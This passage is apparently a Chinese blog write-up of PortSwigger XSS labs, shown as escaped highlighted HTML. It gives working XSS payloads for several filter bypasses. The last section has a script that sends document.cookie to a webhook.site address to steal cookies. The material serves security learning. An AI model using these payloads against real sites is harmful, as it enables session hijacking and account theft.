&lt;&#x2F;span&gt;&lt;span&gt;            commentSection&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;appendChild&lt;&#x2F;span&gt;&lt;span&gt;(document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;createElement&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;p&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            userComments&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;appendChild&lt;&#x2F;span&gt;&lt;span&gt;(commentSection)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;js 中&lt;code&gt;replace&lt;&#x2F;code&gt;只会替换字符的第一次出现。所以 content 填入&lt;code&gt;&amp;lt;&amp;gt;&amp;lt;img src=x onerror=alert(window.origin)&#x2F;&amp;gt;&lt;&#x2F;code&gt;可以直接过&lt;&#x2F;p&gt;
&lt;p&gt;&lt;em&gt;这里发现 svg 好像不能在 p 元素里用 小记一下&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;p&gt;然后再测试了看起来好像存在的&lt;code&gt;Obfuscating attacks via HTML encoding&lt;&#x2F;code&gt;。由于提取文字用的是&lt;code&gt;innerHTML&lt;&#x2F;code&gt;而不是&lt;code&gt;innerText&lt;&#x2F;code&gt;无法实现。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;lab-reflected-xss-into-html-context-with-most-tags-and-attributes-blocked&quot;&gt;Lab: &lt;a href=&quot;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;reflected&quot;&gt;Reflected XSS&lt;&#x2F;a&gt; into HTML context with most tags and attributes blocked&lt;&#x2F;h2&gt;
&lt;p&gt;之前挖自己学校遇到过&lt;a href=&quot;https:&#x2F;&#x2F;src.sjtu.edu.cn&#x2F;post&#x2F;237670&#x2F;&quot;&gt;类似的&lt;&#x2F;a&gt;，不过是存储型的。也就是 &lt;a href=&quot;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;cheat-sheet&quot;&gt;cheet sheet&lt;&#x2F;a&gt; 找一个不常见的属性。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;123&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;style&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;@&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;keyframes &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;x{}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&#x2F;style&amp;gt;&amp;lt;input &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;style&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;animation-name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;onanimationend&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;1+1;b=document;a=window.alert;a(b.cookie)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#d8dee9;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;del&gt;&lt;em&gt;这个存储型+导致登录凭证泄露竟然给我低危🫠。。&lt;&#x2F;em&gt;&lt;&#x2F;del&gt;&lt;&#x2F;p&gt;
&lt;p&gt;这题的合法tag和attributes属实难找。不想写批量检测的，遂抄答案了&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;body &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;onresize&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;print()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;onresize&lt;&#x2F;code&gt;事件在&lt;code&gt;窗口或框架被调整大小时&lt;&#x2F;code&gt;发生。由于给了exploit-server，用 iframe 修改框架大小&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;iframe &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;src&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;https:&#x2F;&#x2F;YOUR-LAB-ID.web-security-academy.net&#x2F;?search=%22%3E%3Cbody%20onresize=print()%3E&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;onload&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;this.style.width&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;100px&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;题解是用的 &lt;code&gt;burp Intruder&lt;&#x2F;code&gt;检测。看来 xss 字典还是有必要的。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;lab-reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones&quot;&gt;Lab: &lt;a href=&quot;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;reflected&quot;&gt;Reflected XSS&lt;&#x2F;a&gt; into HTML context with all tags blocked except custom ones&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;&#x2F;?search=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;xss+id%3Dx+onfocus%3Dalert(document.cookie)%20tabindex=1&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;#x
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;用&lt;code&gt;location.hash&lt;&#x2F;code&gt;配合 id 自动 focus 到元素上触发 onfocus 事件。学到了&lt;&#x2F;p&gt;
&lt;p&gt;exploit-server 可以用 meta refresh 跳转&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;meta &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;http-equiv&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;refresh&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;content&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0; url=&amp;#39;https:&#x2F;&#x2F;0a6400b20383db3782698d65007c00b9.web-security-academy.net&#x2F;?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x&amp;#39;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;lab-reflected-xss-with-some-svg-markup-allowed&quot;&gt;Lab: &lt;a href=&quot;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;reflected&quot;&gt;Reflected XSS&lt;&#x2F;a&gt; with some SVG markup allowed&lt;&#x2F;h2&gt;
&lt;p&gt;这一关没有字符处理，只有返回黑名单。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;cheat-sheet&quot;&gt;XSS Cheet Sheet&lt;&#x2F;a&gt; 有个功能是 Copy tags&#x2F;event&#x2F;payloads，和&lt;code&gt;Burp Suite&lt;&#x2F;code&gt;的 Intruder 功能格式也对接好了。可以直接 Copy-Paste 到 payloads 里&lt;&#x2F;p&gt;
&lt;p&gt;测试发现只有&lt;code&gt;&amp;lt;svg&amp;gt;&lt;&#x2F;code&gt;、&lt;code&gt;&amp;lt;animatetransform&amp;gt;&lt;&#x2F;code&gt;、&lt;code&gt;&amp;lt;title&amp;gt; &lt;&#x2F;code&gt;和 &lt;code&gt;&amp;lt;image&amp;gt;&lt;&#x2F;code&gt;是 valid tag。然后测试&lt;code&gt;&amp;lt;svg&amp;gt;&lt;&#x2F;code&gt;的属性&#x2F;事件，发现全部invalid。&lt;code&gt;&amp;lt;svg&amp;gt;&lt;&#x2F;code&gt;还有后面连接&lt;code&gt;animatetransform&lt;&#x2F;code&gt;、&lt;code&gt;animatemotion&lt;&#x2F;code&gt;、&lt;code&gt;animate&lt;&#x2F;code&gt;的用法，测试发现&lt;code&gt;animatetransform&lt;&#x2F;code&gt;可以使用&lt;&#x2F;p&gt;
&lt;p&gt;然后再对&lt;code&gt;animatetransform&lt;&#x2F;code&gt;的事件&#x2F;属性进行测试，&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;&#x2F;?search=&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;svg&amp;gt;&amp;lt;animatetransform &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;onbegin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;alert(1)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;lab-reflected-xss-in-canonical-link-tag&quot;&gt;Lab: &lt;a href=&quot;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;reflected&quot;&gt;Reflected XSS&lt;&#x2F;a&gt; in canonical link tag&lt;&#x2F;h2&gt;
&lt;p&gt;后端界面渲染。会把&lt;code&gt;&amp;lt;link rel=&quot;canonical&quot; href=&quot;https:&#x2F;&#x2F;0a6e00520312cce98c1ab92f007d0027.web-security-academy.net&#x2F;?[input]&quot;&amp;gt;&lt;&#x2F;code&gt;渲染到canonical head里面。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.1deng.me&#x2F;canonical-url.html#shen_me_shi_canonical_URL_biao_qian&quot;&gt;canonical&lt;&#x2F;a&gt;标签 被称作规范网址，是用来给爬虫机器人看的（配置可以提高SEO）&lt;&#x2F;p&gt;
&lt;p&gt;那么就可以直接注入属性。题解给出的属性是&lt;code&gt;accesskey&lt;&#x2F;code&gt;，由键盘触发。另外注入的其他属性似乎在canonical下不生效。&lt;&#x2F;p&gt;
&lt;p&gt;![image-20230912144444581](webacademy XSS&#x2F;image-20230912144444581.png)&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;&#x2F;?&amp;#39;accesskey=&amp;#39;x&amp;#39;onclick=&amp;#39;alert(document.domain)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;lab-reflected-xss-into-a-javascript-string-with-single-quote-and-backslash-escaped&quot;&gt;Lab: &lt;a href=&quot;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;reflected&quot;&gt;Reflected XSS&lt;&#x2F;a&gt; into a JavaScript string with single quote and backslash escaped&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;searchTerms &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;{{inupt}}&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;lt;img src=&amp;quot;&#x2F;resources&#x2F;images&#x2F;tracker.gif?searchTerms=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;encodeURIComponent&lt;&#x2F;span&gt;&lt;span&gt;(searchTerms)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;quot;&amp;gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;错误的转义策略：没有转义斜杠和尖括号。&lt;&#x2F;p&gt;
&lt;p&gt;直接注入&lt;code&gt;&amp;lt;script&amp;gt;&lt;&#x2F;code&gt;标签。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&#x2F;script&amp;gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;alert&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;domain)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&#x2F;script&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;lab-reflected-xss-into-a-javascript-string-with-angle-brackets&quot;&gt;Lab: &lt;a href=&quot;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;reflected&quot;&gt;Reflected XSS&lt;&#x2F;a&gt; into a JavaScript string with angle brackets&lt;&#x2F;h2&gt;
&lt;p&gt;前端渲染&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;searchTerms &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;{{input}}&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;lt;img src=&amp;quot;&#x2F;resources&#x2F;images&#x2F;tracker.gif?searchTerms=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;encodeURIComponent&lt;&#x2F;span&gt;&lt;span&gt;(searchTerms)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;quot;&amp;gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;反斜杠没有被正确转义&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span&gt;\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;-alert(document.domain)&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#d8dee9;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;lab-stored-xss-into-onclick-event-with-angle-brackets-and-double&quot;&gt;Lab: &lt;a href=&quot;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;stored&quot;&gt;Stored XSS&lt;&#x2F;a&gt; into &lt;code&gt;onclick&lt;&#x2F;code&gt; event with angle brackets and double&lt;&#x2F;h2&gt;
&lt;p&gt;存储型。后端渲染&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;id&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;author&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;href&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;https:&#x2F;&#x2F;ww.adsd&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;onclick&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;tracker&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;track&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;(){}};&lt;&#x2F;span&gt;&lt;span&gt;tracker&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;track&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;{{website}}&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;);&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;1234&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&#x2F;a&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;单双引号、反斜杠均过滤。而onclick事件在触发时会进行一次html实体解码&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;http:&#x2F;&#x2F;foo?&amp;amp;apos;-alert(document.domain)-&amp;amp;apos;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;lab-reflected-xss-into-a-template-literal-with-angle-brackets&quot;&gt;Lab: Reflected XSS into a template literal with angle brackets,&lt;&#x2F;h2&gt;
&lt;p&gt;后端渲染，但是该转义的都转义了。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;message &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;`0 search results for &amp;#39;{{input}}&amp;#39;`&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getElementById&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;searchMessage&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;innerText &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;message&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;但是渲染的字符串在 js 中被飘号（反引号）包裹。用 js 格式化字符串xss。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;&#x2F;?search=${alert(document.domain)}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;lab-exploiting-cross-site-scripting-to-steal-cookies&quot;&gt;Lab: Exploiting cross-site scripting to steal cookies&lt;&#x2F;h2&gt;
&lt;p&gt;想着简单一点直接改location结果找不到report..然后才发现只允许使用burp提供的公共服务器&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;window&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;location&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;https:&#x2F;&#x2F;webhook.site&#x2F;cb9f69b1-bad8-46f1-8a14-a8249b19b89f&#x2F;?cookie=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;cookie&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&#x2F;script&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;反正是对自己 xss 成功了。那就当我解出了吧💦💦&lt;&#x2F;p&gt;
